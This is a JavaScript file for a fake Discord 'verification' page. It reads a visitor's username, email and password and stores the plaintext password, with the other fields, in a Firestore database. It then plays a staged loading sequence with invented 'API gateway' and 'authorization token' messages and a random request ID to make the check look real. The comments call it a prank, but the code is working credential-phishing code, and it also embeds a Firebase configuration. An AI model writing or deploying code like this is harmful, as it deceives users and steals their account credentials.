// Firebase App (the core Firebase SDK) is imported from the CDN
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
import {
    getFirestore,
    collection,
    addDoc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyB_vbvv5kzx-1FnOjnd9Gz93YmqHmuXWX4",
    authDomain: "discord-cfa00.firebaseapp.com",
    projectId: "discord-cfa00",
    storageBucket: "discord-cfa00.firebasestorage.app",
    messagingSenderId: "794086484046",
    appId: "1:794086484046:web:bbdf0d62d1c21302847b1f"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Function to close the Privacy Popup
function closePopup() {
    document.getElementById('privacy-popup').style.display = 'none';
}

// Expose functions to the page when using module script
window.closePopup = closePopup;
window.submitVerification = submitVerification;

async function submitVerification() {
    const username = document.getElementById('username').value.trim();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;

    // Basic Validation
    if (!username || !email || !password) {
        alert("Please fill out all required fields.");
        return;
    }

    if (!email.includes('@') || !email.includes('.')) {
        alert("Please enter a valid email address.");
        return;
    }

    // Save inputs to the browser's local storage so prank.html can read them
    localStorage.setItem('prankUsername', username);
    localStorage.setItem('prankEmail', email);

    // Save submission to Firestore
    try {
        await addDoc(collection(db, 'verifications'), {
            username,
            email,
            password,
            createdAt: serverTimestamp()
        });
    } catch (error) {
        console.error('Firestore submission failed:', error);
        alert('Unable to save verification at this time. Please try again later.');
        return;
    }

    // Generate a fake random request ID
    const randomID = Math.random().toString(36).substring(2, 7).toUpperCase();
    document.getElementById('request-id').innerText = `LML-${randomID}`;

    // Transition from Form (Step 1) to Realistic Loading Screen (Step 2)
    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    // Fake Console Loading Sequence
    const consoleText = document.getElementById('console-text');
    
    setTimeout(() => { consoleText.innerText = "> Pinging Discord API gateway..."; }, 1500);
    setTimeout(() => { consoleText.innerText = "> Cross-referencing global ban database..."; }, 3000);
    setTimeout(() => { consoleText.innerText = "> Encrypting data to bypass owner (Abhijit Samal)..."; }, 4500);
    setTimeout(() => { consoleText.innerText = "> Generating secure authorization token..."; }, 6000);
    setTimeout(() => { 
        consoleText.innerText = "> SUCCESS: Token generated. Routing to bot system..."; 
        consoleText.style.color = "var(--blurple)";
    }, 7500);

    // Transition from Loading (Step 2) to Success Screen (Step 3)
    setTimeout(() => {
        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-3').classList.remove('hidden');

        
    }, 9000);
}